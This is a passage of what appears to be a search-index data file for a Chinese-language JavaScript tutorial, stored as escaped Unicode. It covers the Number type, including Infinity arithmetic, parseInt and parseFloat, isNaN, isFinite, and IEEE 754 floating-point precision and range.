\u8868\u793a\u6b63\u7684\u65e0\u7a77\uff0c -Infinity \u8868\u793a\u8d1f\u7684\u65e0\u7a77\u3002 1 2 3 4 Infinity === - Infinity // false 1 / - 0 // -Infinity - 1 / - 0 // Infinity \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u975e\u96f6\u6b63\u6570\u9664\u4ee5 -0 \uff0c\u4f1a\u5f97\u5230 -Infinity \uff0c\u8d1f\u6570\u9664\u4ee5 -0 \uff0c\u4f1a\u5f97\u5230 Infinity \u3002 \u7531\u4e8e\u6570\u503c\u6b63\u5411\u6ea2\u51fa\uff08overflow\uff09\u3001\u8d1f\u5411\u6ea2\u51fa\uff08underflow\uff09\u548c\u88ab 0 \u9664\uff0cJavaScript \u90fd\u4e0d\u62a5\u9519\uff0c\u6240\u4ee5\u5355\u7eaf\u7684\u6570\u5b66\u8fd0\u7b97\u51e0\u4e4e\u6ca1\u6709\u53ef\u80fd\u629b\u51fa\u9519\u8bef\u3002 Infinity \u5927\u4e8e\u4e00\u5207\u6570\u503c\uff08\u9664\u4e86 NaN \uff09\uff0c -Infinity \u5c0f\u4e8e\u4e00\u5207\u6570\u503c\uff08\u9664\u4e86 NaN \uff09\u3002 1 2 Infinity > 1000 // true - Infinity < - 1000 // true Infinity \u4e0e NaN \u6bd4\u8f83\uff0c\u603b\u662f\u8fd4\u56de false \u3002 1 2 3 4 5 Infinity > NaN // false - Infinity > NaN // false Infinity < NaN // false - Infinity < NaN // false \uff082\uff09\u8fd0\u7b97\u89c4\u5219 Infinity \u7684\u56db\u5219\u8fd0\u7b97\uff0c\u7b26\u5408\u65e0\u7a77\u7684\u6570\u5b66\u8ba1\u7b97\u89c4\u5219\u3002 1 2 3 4 5 * Infinity // Infinity 5 - Infinity // -Infinity Infinity / 5 // Infinity 5 / Infinity // 0 0\u4e58\u4ee5 Infinity \uff0c\u8fd4\u56de NaN \uff1b0\u9664\u4ee5 Infinity \uff0c\u8fd4\u56de 0 \uff1b Infinity \u9664\u4ee50\uff0c\u8fd4\u56de Infinity \u3002 1 2 3 0 * Infinity // NaN 0 / Infinity // 0 Infinity / 0 // Infinity Infinity \u52a0\u4e0a\u6216\u4e58\u4ee5 Infinity \uff0c\u8fd4\u56de\u7684\u8fd8\u662f Infinity \u3002 1 2 Infinity + Infinity // Infinity Infinity * Infinity // Infinity Infinity \u51cf\u53bb\u6216\u9664\u4ee5 Infinity \uff0c\u5f97\u5230 NaN \u3002 1 2 Infinity - Infinity // NaN Infinity / Infinity // NaN Infinity \u4e0e null \u8ba1\u7b97\u65f6\uff0c null \u4f1a\u8f6c\u62100\uff0c\u7b49\u540c\u4e8e\u4e0e 0 \u7684\u8ba1\u7b97\u3002 1 2 3 null * Infinity // NaN null / Infinity // 0 Infinity / null // Infinity Infinity \u4e0e undefined \u8ba1\u7b97\uff0c\u8fd4\u56de\u7684\u90fd\u662f NaN \u3002 1 2 3 4 5 undefined + Infinity // NaN undefined - Infinity // NaN undefined * Infinity // NaN undefined / Infinity // NaN Infinity / undefined // NaN \u4e0e\u6570\u503c\u76f8\u5173\u7684\u5168\u5c40\u65b9\u6cd5 \u00b6 parseInt() \u00b6 \uff081\uff09\u57fa\u672c\u7528\u6cd5 parseInt \u65b9\u6cd5\u7528\u4e8e\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6574\u6570\u3002 1 parseInt ( '123' ) // 123 \u5982\u679c\u5b57\u7b26\u4e32\u5934\u90e8\u6709\u7a7a\u683c\uff0c\u7a7a\u683c\u4f1a\u88ab\u81ea\u52a8\u53bb\u9664\u3002 1 parseInt ( ' 81' ) // 81 \u5982\u679c parseInt \u7684\u53c2\u6570\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u5219\u4f1a\u5148\u8f6c\u4e3a\u5b57\u7b26\u4e32\u518d\u8f6c\u6362\u3002 1 2 3 parseInt ( 1.23 ) // 1 // \u7b49\u540c\u4e8e parseInt ( '1.23' ) // 1 \u5b57\u7b26\u4e32\u8f6c\u4e3a\u6574\u6570\u7684\u65f6\u5019\uff0c\u662f\u4e00\u4e2a\u4e2a\u5b57\u7b26\u4f9d\u6b21\u8f6c\u6362\uff0c\u5982\u679c\u9047\u5230\u4e0d\u80fd\u8f6c\u4e3a\u6570\u5b57\u7684\u5b57\u7b26\uff0c\u5c31\u4e0d\u518d\u8fdb\u884c\u4e0b\u53bb\uff0c\u8fd4\u56de\u5df2\u7ecf\u8f6c\u597d\u7684\u90e8\u5206\u3002 1 2 3 4 5 parseInt ( '8a' ) // 8 parseInt ( '12**' ) // 12 parseInt ( '12.34' ) // 12 parseInt ( '15e2' ) // 15 parseInt ( '15px' ) // 15 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c parseInt \u7684\u53c2\u6570\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u7ed3\u679c\u53ea\u8fd4\u56de\u5b57\u7b26\u4e32\u5934\u90e8\u53ef\u4ee5\u8f6c\u4e3a\u6570\u5b57\u7684\u90e8\u5206\u3002 \u5982\u679c\u5b57\u7b26\u4e32\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e0d\u80fd\u8f6c\u5316\u4e3a\u6570\u5b57\uff08\u540e\u9762\u8ddf\u7740\u6570\u5b57\u7684\u6b63\u8d1f\u53f7\u9664\u5916\uff09\uff0c\u8fd4\u56de NaN \u3002 1 2 3 4 5 parseInt ( 'abc' ) // NaN parseInt ( '.3' ) // NaN parseInt ( '' ) // NaN parseInt ( '+' ) // NaN parseInt ( '+1' ) // 1 \u6240\u4ee5\uff0c parseInt \u7684\u8fd4\u56de\u503c\u53ea\u6709\u4e24\u79cd\u53ef\u80fd\uff0c\u8981\u4e48\u662f\u4e00\u4e2a\u5341\u8fdb\u5236\u6574\u6570\uff0c\u8981\u4e48\u662f NaN \u3002 \u5982\u679c\u5b57\u7b26\u4e32\u4ee5 0x \u6216 0X \u5f00\u5934\uff0c parseInt \u4f1a\u5c06\u5176\u6309\u7167\u5341\u516d\u8fdb\u5236\u6570\u89e3\u6790\u3002 1 parseInt ( '0x10' ) // 16 \u5982\u679c\u5b57\u7b26\u4e32\u4ee5 0 \u5f00\u5934\uff0c\u5c06\u5176\u6309\u716710\u8fdb\u5236\u89e3\u6790\u3002 1 parseInt ( '011' ) // 11 \u5bf9\u4e8e\u90a3\u4e9b\u4f1a\u81ea\u52a8\u8f6c\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\u7684\u6570\u5b57\uff0c parseInt \u4f1a\u5c06\u79d1\u5b66\u8ba1\u6570\u6cd5\u7684\u8868\u793a\u65b9\u6cd5\u89c6\u4e3a\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u5bfc\u81f4\u4e00\u4e9b\u5947\u602a\u7684\u7ed3\u679c\u3002 1 2 3 4 5 6 7 parseInt ( 1000000000000000000000.5 ) // 1 // \u7b49\u540c\u4e8e parseInt ( '1e+21' ) // 1 parseInt ( 0.0000008 ) // 8 // \u7b49\u540c\u4e8e parseInt ( '8e-7' ) // 8 \uff082\uff09\u8fdb\u5236\u8f6c\u6362 parseInt \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff082\u523036\u4e4b\u95f4\uff09\uff0c\u8868\u793a\u88ab\u89e3\u6790\u7684\u503c\u7684\u8fdb\u5236\uff0c\u8fd4\u56de\u8be5\u503c\u5bf9\u5e94\u7684\u5341\u8fdb\u5236\u6570\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c parseInt \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a10\uff0c\u5373\u9ed8\u8ba4\u662f\u5341\u8fdb\u5236\u8f6c\u5341\u8fdb\u5236\u3002 1 2 3 parseInt ( '1000' ) // 1000 // \u7b49\u540c\u4e8e parseInt ( '1000' , 10 ) // 1000 \u4e0b\u9762\u662f\u8f6c\u6362\u6307\u5b9a\u8fdb\u5236\u7684\u6570\u7684\u4f8b\u5b50\u3002 1 2 3 parseInt ( '1000' , 2 ) // 8 parseInt ( '1000' , 6 ) // 216 parseInt ( '1000' , 8 ) // 512 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e8c\u8fdb\u5236\u3001\u516d\u8fdb\u5236\u3001\u516b\u8fdb\u5236\u7684 1000 \uff0c\u5206\u522b\u7b49\u4e8e\u5341\u8fdb\u5236\u76848\u3001216\u548c512\u3002\u8fd9\u610f\u5473\u7740\uff0c\u53ef\u4ee5\u7528 parseInt \u65b9\u6cd5\u8fdb\u884c\u8fdb\u5236\u7684\u8f6c\u6362\u3002 \u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e0d\u662f\u6570\u503c\uff0c\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a\u4e00\u4e2a\u6574\u6570\u3002\u8fd9\u4e2a\u6574\u6570\u53ea\u6709\u57282\u523036\u4e4b\u95f4\uff0c\u624d\u80fd\u5f97\u5230\u6709\u610f\u4e49\u7684\u7ed3\u679c\uff0c\u8d85\u51fa\u8fd9\u4e2a\u8303\u56f4\uff0c\u5219\u8fd4\u56de NaN \u3002\u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f 0 \u3001 undefined \u548c null \uff0c\u5219\u76f4\u63a5\u5ffd\u7565\u3002 1 2 3 4 5 parseInt ( '10' , 37 ) // NaN parseInt ( '10' , 1 ) // NaN parseInt ( '10' , 0 ) // 10 parseInt ( '10' , null ) // 10 parseInt ( '10' , undefined ) // 10 \u5982\u679c\u5b57\u7b26\u4e32\u5305\u542b\u5bf9\u4e8e\u6307\u5b9a\u8fdb\u5236\u65e0\u610f\u4e49\u7684\u5b57\u7b26\uff0c\u5219\u4ece\u6700\u9ad8\u4f4d\u5f00\u59cb\uff0c\u53ea\u8fd4\u56de\u53ef\u4ee5\u8f6c\u6362\u7684\u6570\u503c\u3002\u5982\u679c\u6700\u9ad8\u4f4d\u65e0\u6cd5\u8f6c\u6362\uff0c\u5219\u76f4\u63a5\u8fd4\u56de NaN \u3002 1 2 parseInt ( '1546' , 2 ) // 1 parseInt ( '546' , 2 ) // NaN \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u4e8e\u4e8c\u8fdb\u5236\u6765\u8bf4\uff0c 1 \u662f\u6709\u610f\u4e49\u7684\u5b57\u7b26\uff0c 5 \u3001 4 \u3001 6 \u90fd\u662f\u65e0\u610f\u4e49\u7684\u5b57\u7b26\uff0c\u6240\u4ee5\u7b2c\u4e00\u884c\u8fd4\u56de1\uff0c\u7b2c\u4e8c\u884c\u8fd4\u56de NaN \u3002 \u524d\u9762\u8bf4\u8fc7\uff0c\u5982\u679c parseInt \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u4f1a\u88ab\u5148\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002\u8fd9\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u4ee4\u4eba\u610f\u5916\u7684\u7ed3\u679c\u3002 1 2 3 4 5 6 7 8 9 10 parseInt ( 0x11 , 36 ) // 43 parseInt ( 0x11 , 2 ) // 1 // \u7b49\u540c\u4e8e parseInt ( String ( 0x11 ), 36 ) parseInt ( String ( 0x11 ), 2 ) // \u7b49\u540c\u4e8e parseInt ( '17' , 36 ) parseInt ( '17' , 2 ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5341\u516d\u8fdb\u5236\u7684 0x11 \u4f1a\u88ab\u5148\u8f6c\u4e3a\u5341\u8fdb\u5236\u768417\uff0c\u518d\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002\u7136\u540e\uff0c\u518d\u752836\u8fdb\u5236\u6216\u4e8c\u8fdb\u5236\u89e3\u8bfb\u5b57\u7b26\u4e32 17 \uff0c\u6700\u540e\u8fd4\u56de\u7ed3\u679c 43 \u548c 1 \u3002 \u8fd9\u79cd\u5904\u7406\u65b9\u5f0f\uff0c\u5bf9\u4e8e\u516b\u8fdb\u5236\u7684\u524d\u7f000\uff0c\u5c24\u5176\u9700\u8981\u6ce8\u610f\u3002 1 2 3 4 5 6 7 parseInt ( 011 , 2 ) // NaN // \u7b49\u540c\u4e8e parseInt ( String ( 011 ), 2 ) // \u7b49\u540c\u4e8e parseInt ( String ( 9 ), 2 ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u884c\u7684 011 \u4f1a\u88ab\u5148\u8f6c\u4e3a\u5b57\u7b26\u4e32 9 \uff0c\u56e0\u4e3a 9 \u4e0d\u662f\u4e8c\u8fdb\u5236\u7684\u6709\u6548\u5b57\u7b26\uff0c\u6240\u4ee5\u8fd4\u56de NaN \u3002\u5982\u679c\u76f4\u63a5\u8ba1\u7b97 parseInt('011', 2) \uff0c 011 \u5219\u662f\u4f1a\u88ab\u5f53\u4f5c\u4e8c\u8fdb\u5236\u5904\u7406\uff0c\u8fd4\u56de3\u3002 JavaScript \u4e0d\u518d\u5141\u8bb8\u5c06\u5e26\u6709\u524d\u7f000\u7684\u6570\u5b57\u89c6\u4e3a\u516b\u8fdb\u5236\u6570\uff0c\u800c\u662f\u8981\u6c42\u5ffd\u7565\u8fd9\u4e2a 0 \u3002\u4f46\u662f\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u517c\u5bb9\u6027\uff0c\u5927\u90e8\u5206\u6d4f\u89c8\u5668\u5e76\u6ca1\u6709\u90e8\u7f72\u8fd9\u4e00\u6761\u89c4\u5b9a\u3002 parseFloat() \u00b6 parseFloat \u65b9\u6cd5\u7528\u4e8e\u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6d6e\u70b9\u6570\u3002 1 parseFloat ( '3.14' ) // 3.14 \u5982\u679c\u5b57\u7b26\u4e32\u7b26\u5408\u79d1\u5b66\u8ba1\u6570\u6cd5\uff0c\u5219\u4f1a\u8fdb\u884c\u76f8\u5e94\u7684\u8f6c\u6362\u3002 1 2 parseFloat ( '314e-2' ) // 3.14 parseFloat ( '0.0314E+2' ) // 3.14 \u5982\u679c\u5b57\u7b26\u4e32\u5305\u542b\u4e0d\u80fd\u8f6c\u4e3a\u6d6e\u70b9\u6570\u7684\u5b57\u7b26\uff0c\u5219\u4e0d\u518d\u8fdb\u884c\u5f80\u540e\u8f6c\u6362\uff0c\u8fd4\u56de\u5df2\u7ecf\u8f6c\u597d\u7684\u90e8\u5206\u3002 1 parseFloat ( '3.14more non-digit characters' ) // 3.14 parseFloat \u65b9\u6cd5\u4f1a\u81ea\u52a8\u8fc7\u6ee4\u5b57\u7b26\u4e32\u524d\u5bfc\u7684\u7a7a\u683c\u3002 1 parseFloat ( '\\t\\v\\r12.34\\n ' ) // 12.34 \u5982\u679c\u53c2\u6570\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u6216\u8005\u5b57\u7b26\u4e32\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e0d\u80fd\u8f6c\u5316\u4e3a\u6d6e\u70b9\u6570\uff0c\u5219\u8fd4\u56de NaN \u3002 1 2 3 parseFloat ([]) // NaN parseFloat ( 'FF2' ) // NaN parseFloat ( '' ) // NaN \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5c24\u5176\u503c\u5f97\u6ce8\u610f\uff0c parseFloat \u4f1a\u5c06\u7a7a\u5b57\u7b26\u4e32\u8f6c\u4e3a NaN \u3002 \u8fd9\u4e9b\u7279\u70b9\u4f7f\u5f97 parseFloat \u7684\u8f6c\u6362\u7ed3\u679c\u4e0d\u540c\u4e8e Number \u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 parseFloat ( true ) // NaN Number ( true ) // 1 parseFloat ( null ) // NaN Number ( null ) // 0 parseFloat ( '' ) // NaN Number ( '' ) // 0 parseFloat ( '123.45#' ) // 123.45 Number ( '123.45#' ) // NaN isNaN() \u00b6 isNaN \u65b9\u6cd5\u53ef\u4ee5\u7528\u6765\u5224\u65ad\u4e00\u4e2a\u503c\u662f\u5426\u4e3a NaN \u3002 1 2 isNaN ( NaN ) // true isNaN ( 123 ) // false \u4f46\u662f\uff0c isNaN \u53ea\u5bf9\u6570\u503c\u6709\u6548\uff0c\u5982\u679c\u4f20\u5165\u5176\u4ed6\u503c\uff0c\u4f1a\u88ab\u5148\u8f6c\u6210\u6570\u503c\u3002\u6bd4\u5982\uff0c\u4f20\u5165\u5b57\u7b26\u4e32\u7684\u65f6\u5019\uff0c\u5b57\u7b26\u4e32\u4f1a\u88ab\u5148\u8f6c\u6210 NaN \uff0c\u6240\u4ee5\u6700\u540e\u8fd4\u56de true \uff0c\u8fd9\u4e00\u70b9\u8981\u7279\u522b\u5f15\u8d77\u6ce8\u610f\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c isNaN \u4e3a true \u7684\u503c\uff0c\u6709\u53ef\u80fd\u4e0d\u662f NaN \uff0c\u800c\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002 1 2 3 isNaN ( 'Hello' ) // true // \u76f8\u5f53\u4e8e isNaN ( Number ( 'Hello' )) // true \u51fa\u4e8e\u540c\u6837\u7684\u539f\u56e0\uff0c\u5bf9\u4e8e\u5bf9\u8c61\u548c\u6570\u7ec4\uff0c isNaN \u4e5f\u8fd4\u56de true \u3002 1 2 3 4 5 6 7 isNaN ({}) // true // \u7b49\u540c\u4e8e isNaN ( Number ({})) // true isNaN ([ 'xzy' ]) // true // \u7b49\u540c\u4e8e isNaN ( Number ([ 'xzy' ])) // true \u4f46\u662f\uff0c\u5bf9\u4e8e\u7a7a\u6570\u7ec4\u548c\u53ea\u6709\u4e00\u4e2a\u6570\u503c\u6210\u5458\u7684\u6570\u7ec4\uff0c isNaN \u8fd4\u56de false \u3002 1 2 3 isNaN ([]) // false isNaN ([ 123 ]) // false isNaN ([ '123' ]) // false \u4e0a\u9762\u4ee3\u7801\u4e4b\u6240\u4ee5\u8fd4\u56de false \uff0c\u539f\u56e0\u662f\u8fd9\u4e9b\u6570\u7ec4\u80fd\u88ab Number \u51fd\u6570\u8f6c\u6210\u6570\u503c\uff0c\u8bf7\u53c2\u89c1\u300a\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u7ae0\u3002 \u56e0\u6b64\uff0c\u4f7f\u7528 isNaN \u4e4b\u524d\uff0c\u6700\u597d\u5224\u65ad\u4e00\u4e0b\u6570\u636e\u7c7b\u578b\u3002 1 2 3 function myIsNaN ( value ) { return typeof value === 'number' && isNaN ( value ); } \u5224\u65ad NaN \u66f4\u53ef\u9760\u7684\u65b9\u6cd5\u662f\uff0c\u5229\u7528 NaN \u4e3a\u552f\u4e00\u4e0d\u7b49\u4e8e\u81ea\u8eab\u7684\u503c\u7684\u8fd9\u4e2a\u7279\u70b9\uff0c\u8fdb\u884c\u5224\u65ad\u3002 1 2 3 function myIsNaN ( value ) { return value !== value ; } isFinite() \u00b6 isFinite \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u67d0\u4e2a\u503c\u662f\u5426\u4e3a\u6b63\u5e38\u7684\u6570\u503c\u3002 1 2 3 4 5 6 isFinite ( Infinity ) // false isFinite ( - Infinity ) // false isFinite ( NaN ) // false isFinite ( undefined ) // false isFinite ( null ) // true isFinite ( - 1 ) // true \u9664\u4e86 Infinity \u3001 -Infinity \u3001 NaN \u548c undefined \u8fd9\u51e0\u4e2a\u503c\u4f1a\u8fd4\u56de false \uff0c isFinite \u5bf9\u4e8e\u5176\u4ed6\u7684\u6570\u503c\u90fd\u4f1a\u8fd4\u56de true \u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Dr. Axel Rauschmayer, How numbers are encoded in JavaScript Humphry, JavaScript \u4e2d Number \u7684\u4e00\u4e9b\u8868\u793a\u4e0a/\u4e0b\u9650","title":"\u6570\u503c"},{"location":"types/number/#_1","text":"","title":"\u6570\u503c"},{"location":"types/number/#_2","text":"","title":"\u6982\u8ff0"},{"location":"types/number/#_3","text":"JavaScript \u5185\u90e8\uff0c\u6240\u6709\u6570\u5b57\u90fd\u662f\u4ee564\u4f4d\u6d6e\u70b9\u6570\u5f62\u5f0f\u50a8\u5b58\uff0c\u5373\u4f7f\u6574\u6570\u4e5f\u662f\u5982\u6b64\u3002\u6240\u4ee5\uff0c 1 \u4e0e 1.0 \u662f\u76f8\u540c\u7684\uff0c\u662f\u540c\u4e00\u4e2a\u6570\u3002 1 1 === 1.0 // true \u8fd9\u5c31\u662f\u8bf4\uff0cJavaScript \u8bed\u8a00\u7684\u5e95\u5c42\u6839\u672c\u6ca1\u6709\u6574\u6570\uff0c\u6240\u6709\u6570\u5b57\u90fd\u662f\u5c0f\u6570\uff0864\u4f4d\u6d6e\u70b9\u6570\uff09\u3002\u5bb9\u6613\u9020\u6210\u6df7\u6dc6\u7684\u662f\uff0c\u67d0\u4e9b\u8fd0\u7b97\u53ea\u6709\u6574\u6570\u624d\u80fd\u5b8c\u6210\uff0c\u6b64\u65f6 JavaScript \u4f1a\u81ea\u52a8\u628a64\u4f4d\u6d6e\u70b9\u6570\uff0c\u8f6c\u621032\u4f4d\u6574\u6570\uff0c\u7136\u540e\u518d\u8fdb\u884c\u8fd0\u7b97\uff0c\u53c2\u89c1\u300a\u8fd0\u7b97\u7b26\u300b\u4e00\u7ae0\u7684\u201c\u4f4d\u8fd0\u7b97\u201d\u90e8\u5206\u3002 \u7531\u4e8e\u6d6e\u70b9\u6570\u4e0d\u662f\u7cbe\u786e\u7684\u503c\uff0c\u6240\u4ee5\u6d89\u53ca\u5c0f\u6570\u7684\u6bd4\u8f83\u548c\u8fd0\u7b97\u8981\u7279\u522b\u5c0f\u5fc3\u3002 1 2 3 4 5 6 7 8 0.1 + 0.2 === 0.3 // false 0.3 / 0.1 // 2.9999999999999996 ( 0.3 - 0.2 ) === ( 0.2 - 0.1 ) // false","title":"\u6574\u6570\u548c\u6d6e\u70b9\u6570"},{"location":"types/number/#_4","text":"\u6839\u636e\u56fd\u9645\u6807\u51c6 IEEE 754\uff0cJavaScript \u6d6e\u70b9\u6570\u768464\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff0c\u4ece\u6700\u5de6\u8fb9\u5f00\u59cb\uff0c\u662f\u8fd9\u6837\u7ec4\u6210\u7684\u3002 \u7b2c1\u4f4d\uff1a\u7b26\u53f7\u4f4d\uff0c 0 \u8868\u793a\u6b63\u6570\uff0c 1 \u8868\u793a\u8d1f\u6570 \u7b2c2\u4f4d\u5230\u7b2c12\u4f4d\uff08\u517111\u4f4d\uff09\uff1a\u6307\u6570\u90e8\u5206 \u7b2c13\u4f4d\u5230\u7b2c64\u4f4d\uff08\u517152\u4f4d\uff09\uff1a\u5c0f\u6570\u90e8\u5206\uff08\u5373\u6709\u6548\u6570\u5b57\uff09 \u7b26\u53f7\u4f4d\u51b3\u5b9a\u4e86\u4e00\u4e2a\u6570\u7684\u6b63\u8d1f\uff0c\u6307\u6570\u90e8\u5206\u51b3\u5b9a\u4e86\u6570\u503c\u7684\u5927\u5c0f\uff0c\u5c0f\u6570\u90e8\u5206\u51b3\u5b9a\u4e86\u6570\u503c\u7684\u7cbe\u5ea6\u3002 \u6307\u6570\u90e8\u5206\u4e00\u5171\u670911\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff0c\u56e0\u6b64\u5927\u5c0f\u8303\u56f4\u5c31\u662f0\u52302047\u3002IEEE 754 \u89c4\u5b9a\uff0c\u5982\u679c\u6307\u6570\u90e8\u5206\u7684\u503c\u57280\u52302047\u4e4b\u95f4\uff08\u4e0d\u542b\u4e24\u4e2a\u7aef\u70b9\uff09\uff0c\u90a3\u4e48\u6709\u6548\u6570\u5b57\u7684\u7b2c\u4e00\u4f4d\u9ed8\u8ba4\u603b\u662f1\uff0c\u4e0d\u4fdd\u5b58\u572864\u4f4d\u6d6e\u70b9\u6570\u4e4b\u4e2d\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6709\u6548\u6570\u5b57\u8fd9\u65f6\u603b\u662f 1.xx...xx \u7684\u5f62\u5f0f\uff0c\u5176\u4e2d xx..xx \u7684\u90e8\u5206\u4fdd\u5b58\u572864\u4f4d\u6d6e\u70b9\u6570\u4e4b\u4e2d\uff0c\u6700\u957f\u53ef\u80fd\u4e3a52\u4f4d\u3002\u56e0\u6b64\uff0cJavaScript \u63d0\u4f9b\u7684\u6709\u6548\u6570\u5b57\u6700\u957f\u4e3a53\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u3002 1 (-1)^\u7b26\u53f7\u4f4d * 1.xx...xx * 2^\u6307\u6570\u90e8\u5206 \u4e0a\u9762\u516c\u5f0f\u662f\u6b63\u5e38\u60c5\u51b5\u4e0b\uff08\u6307\u6570\u90e8\u5206\u57280\u52302047\u4e4b\u95f4\uff09\uff0c\u4e00\u4e2a\u6570\u5728 JavaScript \u5185\u90e8\u5b9e\u9645\u7684\u8868\u793a\u5f62\u5f0f\u3002 \u7cbe\u5ea6\u6700\u591a\u53ea\u80fd\u523053\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff0c\u8fd9\u610f\u5473\u7740\uff0c\u7edd\u5bf9\u503c\u5c0f\u4e8e2\u768453\u6b21\u65b9\u7684\u6574\u6570\uff0c\u5373-2 53 \u52302 53 \uff0c\u90fd\u53ef\u4ee5\u7cbe\u786e\u8868\u793a\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 Math . pow ( 2 , 53 ) // 9007199254740992 Math . pow ( 2 , 53 ) + 1 // 9007199254740992 Math . pow ( 2 , 53 ) + 2 // 9007199254740994 Math . pow ( 2 , 53 ) + 3 // 9007199254740996 Math . pow ( 2 , 53 ) + 4 // 9007199254740996 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5927\u4e8e2\u768453\u6b21\u65b9\u4ee5\u540e\uff0c\u6574\u6570\u8fd0\u7b97\u7684\u7ed3\u679c\u5f00\u59cb\u51fa\u73b0\u9519\u8bef\u3002\u6240\u4ee5\uff0c\u5927\u4e8e2\u768453\u6b21\u65b9\u7684\u6570\u503c\uff0c\u90fd\u65e0\u6cd5\u4fdd\u6301\u7cbe\u5ea6\u3002\u7531\u4e8e2\u768453\u6b21\u65b9\u662f\u4e00\u4e2a16\u4f4d\u7684\u5341\u8fdb\u5236\u6570\u503c\uff0c\u6240\u4ee5\u7b80\u5355\u7684\u6cd5\u5219\u5c31\u662f\uff0cJavaScript \u5bf915\u4f4d\u7684\u5341\u8fdb\u5236\u6570\u90fd\u53ef\u4ee5\u7cbe\u786e\u5904\u7406\u3002 1 2 3 4 5 6 Math . pow ( 2 , 53 ) // 9007199254740992 // \u591a\u51fa\u7684\u4e09\u4e2a\u6709\u6548\u6570\u5b57\uff0c\u5c06\u65e0\u6cd5\u4fdd\u5b58 9007199254740992111 // 9007199254740992000 \u4e0a\u9762\u793a\u4f8b\u8868\u660e\uff0c\u5927\u4e8e2\u768453\u6b21\u65b9\u4ee5\u540e\uff0c\u591a\u51fa\u6765\u7684\u6709\u6548\u6570\u5b57\uff08\u6700\u540e\u4e09\u4f4d\u7684 111 \uff09\u90fd\u4f1a\u65e0\u6cd5\u4fdd\u5b58\uff0c\u53d8\u62100\u3002","title":"\u6570\u503c\u7cbe\u5ea6"},{"location":"types/number/#_5","text":"\u6839\u636e\u6807\u51c6\uff0c64\u4f4d\u6d6e\u70b9\u6570\u7684\u6307\u6570\u90e8\u5206\u7684\u957f\u5ea6\u662f11\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff0c\u610f\u5473\u7740\u6307\u6570\u90e8\u5206\u7684\u6700\u5927\u503c\u662f2047\uff082\u768411\u6b21\u65b9\u51cf1\uff09\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c64\u4f4d\u6d6e\u70b9\u6570\u7684\u6307\u6570\u90e8\u5206\u7684\u503c\u6700\u5927\u4e3a2047\uff0c\u5206\u51fa\u4e00\u534a\u8868\u793a\u8d1f\u6570\uff0c\u5219 JavaScript \u80fd\u591f\u8868\u793a\u7684\u6570\u503c\u8303\u56f4\u4e3a2 1024 \u52302 -1023 \uff08\u5f00\u533a\u95f4\uff09\uff0c\u8d85\u51fa\u8fd9\u4e2a\u8303\u56f4\u7684\u6570\u65e0\u6cd5\u8868\u793a\u3002 \u5982\u679c\u4e00\u4e2a\u6570\u5927\u4e8e\u7b49\u4e8e2\u76841024\u6b21\u65b9\uff0c\u90a3\u4e48\u5c31\u4f1a\u53d1\u751f\u201c\u6b63\u5411\u6ea2\u51fa\u201d\uff0c\u5373 JavaScript \u65e0\u6cd5\u8868\u793a\u8fd9\u4e48\u5927\u7684\u6570\uff0c\u8fd9\u65f6\u5c31\u4f1a\u8fd4\u56de Infinity \u3002 1 Math . pow ( 2 , 1024 ) // Infinity \u5982\u679c\u4e00\u4e2a\u6570\u5c0f\u4e8e\u7b49\u4e8e2\u7684-1075\u6b21\u65b9\uff08\u6307\u6570\u90e8\u5206\u6700\u5c0f\u503c-1023\uff0c\u518d\u52a0\u4e0a\u5c0f\u6570\u90e8\u5206\u768452\u4f4d\uff09\uff0c\u90a3\u4e48\u5c31\u4f1a\u53d1\u751f\u4e3a\u201c\u8d1f\u5411\u6ea2\u51fa\u201d\uff0c\u5373 JavaScript \u65e0\u6cd5\u8868\u793a\u8fd9\u4e48\u5c0f\u7684\u6570\uff0c\u8fd9\u65f6\u4f1a\u76f4\u63a5\u8fd4\u56de0\u3002 1 Math . pow ( 2 , - 1075 ) // 0 \u4e0b\u9762\u662f\u4e00\u4e2a\u5b9e\u9645\u7684\u4f8b\u5b50\u3002 